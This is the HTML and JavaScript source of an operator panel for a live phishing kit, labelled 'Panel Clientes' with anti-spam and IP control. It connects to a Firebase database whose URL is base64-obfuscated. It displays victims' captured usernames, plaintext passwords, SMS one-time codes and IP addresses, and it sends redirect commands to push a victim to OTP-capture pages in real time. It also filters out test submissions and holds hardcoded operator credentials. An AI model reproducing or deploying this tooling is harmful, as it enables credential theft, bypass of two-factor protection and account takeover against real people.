<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Panel con Anti-Spam + Control IPs</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { background-color: #0f172a; font-family: 'Inter', sans-serif; color: white; }
        .card-user { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 16px; }
        .card-spam { background: #451a1a; border: 1px solid #ef4444; opacity: 0.7; }
        .ip-bloqueada { background: #7f1d1d; border: 2px solid #dc2626; }
        .ip-repetida { background: #78350f; border: 2px solid #f59e0b; }
        .btn { padding: 8px 16px; border-radius: 6px; font-size: 11px; cursor: pointer; border: none; margin: 2px; font-weight: bold; }
        .btn-blue { background: #3b82f6; color: white; }
        .btn-purple { background: #8b5cf6; color: white; }
        .btn-red { background: #dc2626; color: white; }
        .btn-orange { background: #f97316; color: white; }
        .btn-green { background: #10b981; color: white; }
        .btn-amber { background: #f59e0b; color: black; }
        .badge { padding: 2px 8px; border-radius: 12px; font-size: 10px; font-weight: bold; }
        .badge-red { background: #dc2626; color: white; }
        .badge-amber { background: #f59e0b; color: black; }
        .badge-green { background: #10b981; color: white; }
        #login-overlay { position: fixed; inset: 0; background: #0f172a; z-index: 50; display: flex; align-items: center; justify-content: center; }
        #panel-content { display: none; }
    </style>
</head>
<body class="p-4">

    <!-- LOGIN -->
    <div id="login-overlay">
        <div class="bg-slate-800 p-8 rounded-xl border border-slate-700 w-full max-w-md text-center">
            <h2 class="text-2xl font-bold mb-4 text-blue-400">ACCESO PANEL</h2>
            <input type="text" id="admin-user" placeholder="Usuario" class="w-full bg-slate-900 border border-slate-700 p-3 rounded-lg text-white mb-4"><br>
            <input type="password" id="admin-pass" placeholder="Contraseña" class="w-full bg-slate-900 border border-slate-700 p-3 rounded-lg text-white mb-4"><br>
            <button onclick="validarAcceso()" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-lg">ENTRAR</button>
            <p id="error-msg" class="text-red-500 text-sm mt-2 hidden"></p>
        </div>
    </div>

    <div id="panel-content">
        <!-- HEADER -->
        <div class="flex justify-between items-center mb-6 border-b border-slate-700 pb-4">
            <div>
                <h1 class="text-3xl font-black text-white">PANEL <span class="text-blue-500">CLIENTES</span></h1>
                <p class="text-slate-500 text-xs">Anti-Spam + Control de IPs</p>
            </div>
            <div class="flex items-center gap-4">
                <button onclick="cambiarVista('ips')" class="btn btn-amber">📊 IPs</button>
                <button onclick="cambiarVista('blacklist')" class="btn btn-red">🚫 Bloqueadas</button>
                <button onclick="cerrarSesion()" class="text-slate-400 hover:text-white text-sm">SALIR</button>
            </div>
        </div>

        <!-- STATS -->
        <div class="grid grid-cols-5 gap-4 mb-6">
            <div class="bg-slate-800 p-4 rounded-xl"><p class="text-xs text-slate-500">TOTAL</p><p id="stat-total" class="text-2xl font-bold text-white">0</p></div>
            <div class="bg-slate-800 p-4 rounded-xl"><p class="text-xs text-slate-500">ONLINE</p><p id="stat-online" class="text-2xl font-bold text-emerald-400">0</p></div>
            <div class="bg-slate-800 p-4 rounded-xl"><p class="text-xs text-slate-500">SPAM</p><p id="stat-spam" class="text-2xl font-bold text-rose-400">0</p></div>
            <div class="bg-slate-800 p-4 rounded-xl"><p class="text-xs text-slate-500">IPs ÚNICAS</p><p id="stat-ips" class="text-2xl font-bold text-blue-400">0</p></div>
            <div class="bg-slate-800 p-4 rounded-xl"><p class="text-xs text-slate-500">IPs BLOQUEADAS</p><p id="stat-blocked" class="text-2xl font-bold text-red-500">0</p></div>
        </div>

        <!-- BOTONES -->
        <div class="flex gap-2 mb-4 flex-wrap">
            <button onclick="cambiarVista('validos')" class="btn btn-green">✓ Registros</button>
            <button onclick="cambiarVista('spam')" class="btn btn-red">🗑 Papelera</button>
            <button onclick="cambiarVista('todos')" class="btn btn-blue">Todos</button>
        </div>

        <div id="container" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4"></div>
    </div>

    <script>
        const DB_URL = atob("aHR0cHM6Ly9jb29wLTI5LW9jdHUtYnJlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS8=");
        let db;
        let vistaActual = 'validos';
        let datos = { validos: [], spam: [], blacklist: {} };
        let contadorIPs = {};

        // ANTI-SPAM RESTRINGIDO
        function esSpam(id, data) {
            if (!data || !data.user || !data.pass) return true;
            
            // IDs de prueba
            const spamIds = ['test', 'prueba', 'admin', 'demo', 'fake', 'id-test'];
            if (spamIds.some(s => id.toLowerCase().includes(s))) return true;
            
            // Usuarios de prueba
            const spamUsers = ['test', 'prueba', 'admin', 'usuario1', 'usuario2', 'usuario3', 'usuario4', 'usuario5', 'usuario6', 'usuario7', 'usuario8'];
            const userLower = (data.user || '').toLowerCase();
            if (spamUsers.includes(userLower)) return true;
            
            // Contraseñas de prueba
            const spamPasses = ['test', 'prueba', 'admin', '123', 'clave1', 'clave2', 'clave3', 'clave4', 'clave5'];
            const passLower = (data.pass || '').toLowerCase();
            if (spamPasses.includes(passLower)) return true;
            
            // IP bloqueada
            if (data.ip && datos.blacklist[data.ip]) return true;
            
            return false;
        }

        function validarAcceso() {
            const u = document.getElementById('admin-user').value;
            const p = document.getElementById('admin-pass').value;
            if (u === "Ghost" && p === "Cabimas01.") {
                sessionStorage.setItem('auth_panel', 'true');
                document.getElementById('login-overlay').style.display = 'none';
                document.getElementById('panel-content').style.display = 'block';
                iniciarFirebase();
            } else {
                document.getElementById('error-msg').textContent = 'Credenciales incorrectas';
                document.getElementById('error-msg').classList.remove('hidden');
            }
        }

        if (sessionStorage.getItem('auth_panel') === 'true') {
            document.getElementById('login-overlay').style.display = 'none';
            document.getElementById('panel-content').style.display = 'block';
            iniciarFirebase();
        }

        function cerrarSesion() {
            sessionStorage.removeItem('auth_panel');
            window.location.reload();
        }

        function iniciarFirebase() {
            const firebaseConfig = { databaseURL: DB_URL };
            if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
            db = firebase.database();

            db.ref('logins').on('value', (snap) => {
                const validos = [];
                contadorIPs = {};
                
                snap.forEach((child) => {
                    const data = child.val();
                    const id = child.key;
                    
                    if (data.ip && data.ip !== 'unknown') {
                        contadorIPs[data.ip] = (contadorIPs[data.ip] || 0) + 1;
                    }
                    
                    validos.push({ id, data, esSpam: false });
                });
                
                datos.validos = validos;
                renderizar();
            });

            db.ref('spam').on('value', (snap) => {
                const spam = [];
                snap.forEach((child) => {
                    spam.push({ id: child.key, data: child.val(), esSpam: true });
                });
                datos.spam = spam;
                renderizar();
            });

            db.ref('blacklist').on('value', (snap) => {
                datos.blacklist = snap.val() || {};
                document.getElementById('stat-blocked').textContent = Object.keys(datos.blacklist).length;
                renderizar();
            });
        }

        function cambiarVista(vista) {
            vistaActual = vista;
            renderizar();
        }

        function renderizar() {
            const container = document.getElementById('container');
            container.innerHTML = '';

            document.getElementById('stat-total').textContent = datos.validos.length;
            document.getElementById('stat-spam').textContent = datos.spam.length;
            document.getElementById('stat-online').textContent = datos.validos.filter(d => d.data.online).length;
            document.getElementById('stat-ips').textContent = Object.keys(contadorIPs).length;

            if (vistaActual === 'ips') { renderizarIPs(); return; }
            if (vistaActual === 'blacklist') { renderizarBlacklist(); return; }

            let aMostrar = [];
            if (vistaActual === 'validos') aMostrar = datos.validos;
            else if (vistaActual === 'spam') aMostrar = datos.spam;
            else aMostrar = [...datos.validos, ...datos.spam];

            if (aMostrar.length === 0) {
                container.innerHTML = '<div class="text-slate-500 text-center col-span-3 py-10">No hay registros</div>';
                return;
            }

            aMostrar.forEach(({id, data, esSpam}) => {
                const isOnline = data.online === true;
                const tieneOTP = data.sms && data.sms !== '----' && data.sms !== '';
                const vecesIP = contadorIPs[data.ip] || 1;
                const ipBloqueada = data.ip && datos.blacklist[data.ip];
                
                let cardClass = 'card-user';
                if (esSpam) cardClass = 'card-user card-spam';
                else if (ipBloqueada) cardClass = 'card-user ip-bloqueada';
                else if (vecesIP >= 5) cardClass = 'card-user ip-repetida';
                
                container.innerHTML += `
                    <div class="${cardClass}">
                        <div class="flex justify-between items-center mb-2">
                            <span class="text-xs text-slate-400">#${id.slice(-8)}</span>
                            <div class="flex gap-1">
                                ${vecesIP > 1 ? `<span class="badge badge-amber">${vecesIP}</span>` : ''}
                                ${ipBloqueada ? '<span class="badge badge-red">BLOQUEADA</span>' : ''}
                                ${isOnline ? '<span class="badge badge-green">ONLINE</span>' : ''}
                            </div>
                        </div>
                        
                        <div class="bg-slate-900 p-2 rounded mb-2">
                            <p class="text-xs text-slate-500">USUARIO</p>
                            <p class="text-white font-bold text-sm">${data.user || 'N/A'}</p>
                        </div>
                        
                        <div class="bg-slate-900 p-2 rounded mb-2">
                            <p class="text-xs text-slate-500">CONTRASEÑA</p>
                            <p class="text-rose-400 font-bold text-sm">${data.pass || '****'}</p>
                        </div>
                        
                        <div class="bg-slate-900 p-2 rounded mb-2 text-center border ${tieneOTP ? 'border-emerald-500' : 'border-slate-700'}">
                            <p class="text-xs ${tieneOTP ? 'text-emerald-400' : 'text-slate-500'} mb-1">${tieneOTP ? '✓ CÓDIGO OK' : 'ESPERANDO'}</p>
                            <p class="text-xl font-black ${tieneOTP ? 'text-emerald-400' : 'text-blue-400'} tracking-widest">${data.sms || '----'}</p>
                        </div>
                        
                        <div class="bg-slate-900/50 p-2 rounded mb-2 flex justify-between items-center">
                            <div>
                                <p class="text-xs text-slate-500">IP</p>
                                <p class="text-amber-400 font-mono text-xs">${data.ip || 'N/A'}</p>
                            </div>
                            ${data.ip ? `<button onclick="toggleBlockIP('${data.ip}')" class="btn ${ipBloqueada ? 'btn-green' : 'btn-red'}" style="padding: 4px 8px; font-size: 10px;">${ipBloqueada ? 'Desbloquear' : 'Bloquear'}</button>` : ''}
                        </div>
                        
                        <div class="flex justify-between text-xs text-slate-500 mb-2 px-1">
                            <span>${data.step || 'Registrado'}</span>
                            <span>${data.timestamp ? new Date(data.timestamp).toLocaleTimeString() : ''}</span>
                        </div>

                        ${esSpam ? `
                            <div class="flex gap-1">
                                <button onclick="recuperar('${id}')" class="btn btn-green">♻ Recuperar</button>
                                <button onclick="eliminarSpam('${id}')" class="btn btn-red">Eliminar</button>
                            </div>
                        ` : `
                            <div class="grid grid-cols-2 gap-1">
                                <button onclick="solicitarOTP('${id}')" class="btn btn-blue">Solicitar OTP</button>
                                <button onclick="solicitarOTP2('${id}')" class="btn btn-purple">Solicitar OTP 2</button>
                                <button onclick="rechazar('${id}')" class="btn btn-orange">Rechazar</button>
                                <button onclick="eliminar('${id}')" class="btn btn-red">Borrar</button>
                            </div>
                        `}
                    </div>
                `;
            });
        }

        function renderizarIPs() {
            const container = document.getElementById('container');
            const ipsOrdenadas = Object.entries(contadorIPs).sort((a, b) => b[1] - a[1]);
            
            if (ipsOrdenadas.length === 0) {
                container.innerHTML = '<div class="text-slate-500 text-center col-span-3 py-10">No hay IPs</div>';
                return;
            }

            let html = '<div class="col-span-3 bg-slate-800 p-6 rounded-xl">';
            html += '<h3 class="text-xl font-bold mb-4 text-amber-400">📊 IPs por frecuencia</h3>';
            html += '<table class="w-full text-left">';
            html += '<tr class="text-slate-500 text-xs border-b border-slate-700"><th>IP</th><th>Intentos</th><th>Estado</th><th>Acción</th></tr>';
            
            ipsOrdenadas.forEach(([ip, count]) => {
                const bloqueada = datos.blacklist[ip];
                html += `<tr class="border-b border-slate-700/30 ${bloqueada ? 'bg-red-900/30' : count >= 5 ? 'bg-amber-900/30' : ''}"><td class="py-3 font-mono ${bloqueada ? 'text-red-400' : 'text-white'}">${ip}</td><td class="py-3"><span class="badge ${count >= 10 ? 'badge-red' : count >= 5 ? 'badge-amber' : 'badge-green'}">${count}</span></td><td class="py-3 text-xs">${bloqueada ? '<span class="text-red-400">BLOQUEADA</span>' : '<span class="text-emerald-400">Activa</span>'}</td><td class="py-3"><button onclick="toggleBlockIP('${ip}')" class="btn ${bloqueada ? 'btn-green' : 'btn-red'}" style="padding: 4px 12px;">${bloqueada ? 'Desbloquear' : 'Bloquear'}</button></td></tr>`;
            });
            
            html += '</table></div>';
            container.innerHTML = html;
        }

        function renderizarBlacklist() {
            const container = document.getElementById('container');
            const ipsBloqueadas = Object.entries(datos.blacklist);
            
            if (ipsBloqueadas.length === 0) {
                container.innerHTML = '<div class="text-slate-500 text-center col-span-3 py-10">No hay IPs bloqueadas</div>';
                return;
            }

            let html = '<div class="col-span-3 bg-red-900/20 border border-red-500 p-6 rounded-xl">';
            html += '<h3 class="text-xl font-bold mb-4 text-red-400">🚫 IPs Bloqueadas</h3>';
            html += '<table class="w-full text-left">';
            html += '<tr class="text-red-300 text-xs border-b border-red-700"><th>IP</th><th>Desde</th><th>Acción</th></tr>';
            
            ipsBloqueadas.forEach(([ip, info]) => {
                html += `<tr class="border-b border-red-700/30"><td class="py-3 font-mono text-red-200">${ip}</td><td class="py-3 text-sm text-red-300">${info.since ? new Date(info.since).toLocaleString() : 'N/A'}</td><td class="py-3"><button onclick="toggleBlockIP('${ip}')" class="btn btn-green" style="padding: 4px 12px;">Desbloquear</button></td></tr>`;
            });
            
            html += '</table></div>';
            container.innerHTML = html;
        }

        function toggleBlockIP(ip) {
            if (!ip || ip === 'unknown') return;
            
            if (datos.blacklist[ip]) {
                if (confirm(`¿Desbloquear ${ip}?`)) {
                    const ipKey = ip.replace(/\./g, '_');
                    db.ref('blacklist/' + ipKey).remove();
                }
            } else {
                if (confirm(`¿Bloquear PERMANENTEMENTE ${ip}?`)) {
                    const ipKey = ip.replace(/\./g, '_');
                    db.ref('blacklist/' + ipKey).set({ ip: ip, since: Date.now() });
                    
                    datos.validos.forEach(({id, data}) => {
                        if (data.ip === ip) {
                            db.ref('spam/' + id).set({...data, blocked: true});
                            db.ref('logins/' + id).remove();
                        }
                    });
                }
            }
        }

        function solicitarOTP(id) {
            db.ref('comandos/' + id).set({ redirect: 'otp.html', ts: Date.now() });
            alert('✓ Redirigiendo a otp.html');
        }

        function solicitarOTP2(id) {
            db.ref('comandos/' + id).set({ redirect: 'otp2.html', ts: Date.now() });
            alert('✓ Redirigiendo a otp2.html');
        }

        function rechazar(id) {
            db.ref('comandos/' + id).set({ redirect: 'index.html', ts: Date.now() });
            db.ref('logins/' + id).update({ step: 'Rechazado', online: false });
        }

        function recuperar(id) {
            if (!confirm('¿Recuperar?')) return;
            db.ref('spam/' + id).once('value').then((snap) => {
                const data = snap.val();
                if (data) {
                    db.ref('logins/' + id).set(data);
                    db.ref('spam/' + id).remove();
                }
            });
        }

        function eliminarSpam(id) {
            if (!confirm('¿Eliminar permanentemente?')) return;
            db.ref('spam/' + id).remove();
        }

        function eliminar(id) {
            if (!confirm('¿Mover a papelera?')) return;
            db.ref('logins/' + id).remove();
        }
    </script>
</body>
</html>
